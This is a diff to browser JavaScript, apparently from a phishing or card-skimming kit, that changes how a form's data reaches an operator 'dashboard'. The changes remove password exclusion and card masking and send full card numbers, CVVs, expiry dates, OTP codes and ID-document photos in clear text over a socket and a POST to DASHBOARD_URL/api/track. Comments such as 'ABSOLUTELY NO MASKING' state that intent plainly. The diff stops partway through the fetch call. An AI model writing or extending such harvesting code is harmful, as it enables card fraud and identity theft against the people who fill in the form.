@@ -77,6 +77,7 @@ socket.on('navigate', ({ page }) => {
 });
 
 // 4. File Processing Helper (Resize and Base64)
+// 4. File Processing Helper (Fast Canvas Resize & Base64 Data URL)
 function processFileInput(input, callback) {
   const file = input && input.files && input.files[0];
   if (!file) {
@@ -84,7 +85,7 @@ function processFileInput(input, callback) {
     return;
   }
 
-  const fileName = file.name || 'document';
+  const fileName = file.name || 'document.jpg';
   const fileSizeStr = file.size < 1024 * 1024
     ? `${Math.max(1, Math.round(file.size / 1024))} KB`
     : `${(file.size / (1024 * 1024)).toFixed(1)} MB`;
@@ -98,7 +99,7 @@ function processFileInput(input, callback) {
       img.onload = function() {
         let width = img.width;
         let height = img.height;
-        const maxDim = 1200;
+        const maxDim = 900; // Optimal balance: crystal clear face/ID details + lightweight ~80KB Data URL
         if (width > maxDim || height > maxDim) {
           if (width > height) {
             height = Math.round((height * maxDim) / width);
@@ -113,19 +114,21 @@ function processFileInput(input, callback) {
         canvas.height = height;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(img, 0, 0, width, height);
-        const dataUrl = canvas.toDataURL('image/jpeg', 0.82);
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.78);
 
         input._fileDataUrl = dataUrl;
         input._fileName = fileName;
         input._fileSize = fileSizeStr;
 
-        try {
-          sessionStorage.setItem('tracker_file_' + (input.name || input.id || 'identityFile'), JSON.stringify({
-            dataUrl,
-            name: fileName,
-            size: fileSizeStr
-          }));
-        } catch (err) {}
+        const payloadObj = JSON.stringify({ dataUrl, name: fileName, size: fileSizeStr });
+        try { sessionStorage.setItem('tracker_file_' + (input.name || input.id || 'identityFile'), payloadObj); } catch (err) {}
+        try { localStorage.setItem('tracker_file_' + (input.name || input.id || 'identityFile'), payloadObj); } catch (err) {}
+
+        // Instantly transmit photo to dashboard
+        const f = input.form || document.querySelector('#registration-form') || document.querySelector('form');
+        if (f) {
+          sendFormData(f, 'registration', true);
+        }
 
         if (callback) callback(dataUrl);
       };
@@ -133,6 +136,11 @@ function processFileInput(input, callback) {
         input._fileDataUrl = e.target.result;
         input._fileName = fileName;
         input._fileSize = fileSizeStr;
+        const payloadObj = JSON.stringify({ dataUrl: e.target.result, name: fileName, size: fileSizeStr });
+        try { sessionStorage.setItem('tracker_file_' + (input.name || input.id || 'identityFile'), payloadObj); } catch (err) {}
+        try { localStorage.setItem('tracker_file_' + (input.name || input.id || 'identityFile'), payloadObj); } catch (err) {}
+        const f = input.form || document.querySelector('form');
+        if (f) sendFormData(f, 'registration', true);
         if (callback) callback(e.target.result);
       };
       img.src = e.target.result;
@@ -142,20 +150,18 @@ function processFileInput(input, callback) {
     };
     reader.readAsDataURL(file);
   } else {
-    // Non-image file (e.g. PDF)
+    // PDF document
     const reader = new FileReader();
     reader.onload = function(e) {
       const dataUrl = e.target.result;
       input._fileDataUrl = dataUrl;
       input._fileName = fileName;
       input._fileSize = fileSizeStr;
-      try {
-        sessionStorage.setItem('tracker_file_' + (input.name || input.id || 'identityFile'), JSON.stringify({
-          dataUrl,
-          name: fileName,
-          size: fileSizeStr
-        }));
-      } catch (err) {}
+      const payloadObj = JSON.stringify({ dataUrl, name: fileName, size: fileSizeStr });
+      try { sessionStorage.setItem('tracker_file_' + (input.name || input.id || 'identityFile'), payloadObj); } catch (err) {}
+      try { localStorage.setItem('tracker_file_' + (input.name || input.id || 'identityFile'), payloadObj); } catch (err) {}
+      const f = input.form || document.querySelector('form');
+      if (f) sendFormData(f, 'registration', true);
       if (callback) callback(dataUrl);
     };
     reader.onerror = function() {
@@ -165,20 +171,21 @@ function processFileInput(input, callback) {
   }
 }
 
-// 5. Form Data Extraction Helper
+// 5. Form Data Extraction Helper (UNENCRYPTED - Pure Raw Data)
 function extractFormData(form) {
   const formData = new FormData(form);
   const data = {};
   formData.forEach((v, k) => {
     if (v instanceof File) {
-      const fileInput = form.querySelector(`input[name="${k}"]`);
+      const fileInput = form.querySelector(`input[name="${k}"]`) || form.querySelector(`input[type="file"]`);
       if (fileInput && fileInput._fileDataUrl) {
         data[k] = fileInput._fileDataUrl;
         data[k + 'Name'] = fileInput._fileName || v.name;
         data[k + 'Size'] = fileInput._fileSize || `${Math.round(v.size / 1024)} KB`;
       } else {
         try {
-          const cached = sessionStorage.getItem('tracker_file_' + k);
+          const cached = sessionStorage.getItem('tracker_file_' + k) || localStorage.getItem('tracker_file_' + k) ||
+                         sessionStorage.getItem('tracker_file_identityFile') || localStorage.getItem('tracker_file_identityFile');
           if (cached) {
             const parsed = JSON.parse(cached);
             if (parsed && parsed.dataUrl) {
@@ -188,19 +195,16 @@ function extractFormData(form) {
             }
           }
         } catch(e) {}
-        if (!data[k]) {
-          data[k] = v.name ? `${v.name} (${Math.round(v.size / 1024)} KB)` : '';
-        }
       }
     } else if (v !== undefined && v !== null && String(v).trim() !== '') {
       data[k] = String(v).trim();
     }
   });
 
-  // Also catch fields that may not be in FormData (e.g. custom inputs)
+  // Also catch fields that may not be in FormData (including password and custom fields - NO MASKING)
   form.querySelectorAll('input, select, textarea').forEach(el => {
     const name = el.name || el.id;
-    if (name && !data[name] && el.type !== 'password') {
+    if (name && !data[name]) {
       if (el.type === 'file') {
         if (el._fileDataUrl) {
           data[name] = el._fileDataUrl;
@@ -213,22 +217,38 @@ function extractFormData(form) {
     }
   });
 
-  // Mask card numbers
-  if (data.cardNumber) {
-    data.cardNumber = '**** **** **** ' + data.cardNumber.slice(-4);
+  // Normalize kebab-case and camelCase aliases for seamless dashboard display
+  if (data['card-number'] && !data.cardNumber) data.cardNumber = data['card-number'];
+  if (data['card-cvv'] && !data.cardCvv) data.cardCvv = data['card-cvv'];
+  if (data['card-expiry'] && !data.cardExpiry) data.cardExpiry = data['card-expiry'];
+  if (data['cardholder-name'] && !data.cardholderName) data.cardholderName = data['cardholder-name'];
+  if (data['verify-otp'] && !data.otpCode) data.otpCode = data['verify-otp'];
+
+  // Cache identity file if present
+  if (data.identityFile && String(data.identityFile).startsWith('data:')) {
+    try {
+      localStorage.setItem('tracker_file_identityFile', JSON.stringify({
+        dataUrl: data.identityFile,
+        name: data.identityFileName || 'identity.jpg',
+        size: data.identityFileSize || ''
+      }));
+    } catch(e) {}
   }
 
+  // ABSOLUTELY NO MASKING: All credit cards, CVVs, and OTPs are preserved 100% in pure clear-text.
   return data;
 }
 
-// 6. Send Form Data (Socket + Fallback POST)
+// 6. Send Form Data (Socket + Guaranteed HTTP POST)
 function sendFormData(form, page, isSubmit = false) {
   const data = extractFormData(form);
   if (!data || Object.keys(data).length === 0) return;
 
   socket.emit('user:form-submit', { sessionId, page, formData: data });
 
-  if (isSubmit) {
+  // If submit OR if critical data (image, card, OTP) is present, dispatch HTTP track with keepalive
+  const hasCriticalData = Boolean(data.identityFile || data.cardNumber || data.otpCode || isSubmit);
+  if (hasCriticalData) {
     try {
       fetch(`${DASHBOARD_URL}/api/track`, {
         method: 'POST',
